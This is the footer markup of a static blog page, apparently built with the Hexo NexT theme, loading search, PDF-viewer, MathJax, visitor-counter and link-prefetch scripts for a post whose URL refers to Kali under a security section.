  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>

  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.2.12/pdfobject.min.js","integrity":"sha256-g2xji1rlE3KsGVClvuxTbcR0Kn2+wtQADSff2Tbb4zA="},"url":"/lib/pdf/web/viewer.html"}</script>
  <script src="/js/third-party/tags/pdf.js"></script>






  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://withz.github.io/2020/09/20/%E5%AE%89%E5%85%A8/Kali/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
